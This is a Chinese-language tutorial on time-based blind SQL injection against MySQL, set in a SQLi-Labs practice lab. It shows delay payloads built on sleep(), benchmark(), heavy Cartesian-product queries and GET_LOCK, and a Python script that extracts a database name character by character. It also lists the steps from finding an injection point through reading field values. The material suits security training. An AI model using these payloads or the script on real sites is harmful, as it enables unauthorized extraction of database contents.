延时注入

​ 延时盲注（Time-based blind SQL injection），是另一种常见的SQL注入，当不同参数相应的页面都一样，或返回的信息都一致时使用延时盲注更加合适，但这种注入方式的效率很低。

​ 下面通过payload来判断数据库的版本信息。

mysql> select * from users where username='admin' and if(left(version(),1)>=5,sleep(3),0);
-- 输出
Empty set (3.00 sec)

注入原理

​ 延时注入主要是通过页面增加响应的时间来判断延时注入是否成功。增加响应时间主要通过暂停程序和增加CPU的计算量。

sleep()函数

mysql> select if(version()>=5,sleep(5),0);
-- 输出
+-----------------------------+
| if(version()>=5,sleep(5),0) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set, 1 warning (5.13 sec)

Benchmark函数

mysql> select benchmark(10000000,sha(1)); 
-- 输出
+-------------------------------+
|benchmark(10000000,sha(1))| 
+-------------------------------+ 
|                                   0| 
+-------------------------------+ 
1 row in set (2.79 sec)

笛卡尔积

​ 这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积。但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，导致延时时间无法控制。实际利用起来不算好用。

SELECT count(*) FROM information_schema.columns A, information_schema.columns B;

​ 这里选用information_schema.columns表的原因是其内部数据较多，到时候可以根据实际情况调换。A,B的意思就是构成有序N元组，AB是其顺序。查询结果如下：

​ 可以看到，当为有序三元组时，有了较为明显的延迟。所以在写时间盲注脚本的时候把sleep函数替换为

(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)

即可。脚本如下：

import requests

url = 'http://127.0.0.1/Less-9/?id=1'

beg = "' and if(ascii(substr((select database()),{0},1))={1},"

end = "(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C),NULL);--+"
flag = ''
for i in range(1,11):
    for j in range(32,127):
        payload = url + beg.format(i,j) + end
        print(payload)
        try:
            web = requests.get(payload,timeout=5)
        except:
            flag += chr(j)
            print(flag)
            break

GET_LOCK加锁

知识点

  • mysql_pconnect(server,user,pwd,clientflag)

mysql_pconnect()函数 打开一个到 MySQL 服务器的持久连接mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别：

  • 当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接， 如果找到，则返回此连接标识而不打开新连接。
  • 当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用 （mysql_close() 不会关闭由mysql_pconnect() 建立的连接）。
  • get_lock(str,timeout)

Tries to obtain a lock with a name given by the string, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name. get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。在一个session中锁定变量，同时通过另外一个session执行，将会产生延时

​ 举个栗子 打开两个mysql的shell现在一个shell中执行命令 select get_lock(‘test’,5) 先上锁 然后另外一个shell中执行重复的命令

第二个shell中便出现延迟

注入步骤

  1. 注入点判断。判断测试点是否存在SQL注入漏洞。
  2. 注入类型判断。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。
  3. 判断SQL语句操作的回显。分别构造恒真语句和恒假语句，比较得到其返回页面的响应时间，再根据响应时间来对延时注入执行的结果进行判断。
  4. 构造SQL注入获取数据库指纹等。在猜解数据库内部信息时，需要先得到数据库用户名、版本、数据库名称等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的1day有很大的帮助。
  5. 构造SQL语句猜解数据表名。对数据库进行猜解破的最终目的是猜解数据库字段值，但在猜解字段值之前我们需要知道相对应的字段名和表名，因此开始正式猜解破时，需要先得到数据库的表名信息。延时注入需要一个字符一个字符的猜解。
  6. 构造SQL语句猜解字段名。在拿到数据库表名信息后，需要继续猜解表中的字段值，以判断哪些字段是我们想要得到的。
  7. 构造SQL语句猜解字段值。猜解破的最终目的就是猜解表中的字段值，再得到表名、字段名后就需要尝试猜解我们想要得到的字段值。

演示环境

  • 服务器系统：Windows Server 2008 R2
  • 脚本：php-5.2.17nts
  • 中间件：Apache-2.4.29
  • 数据库：mysql-5.1.73(root)
  • 客户机：Windows 10
  • 靶机：SQLi-Labs
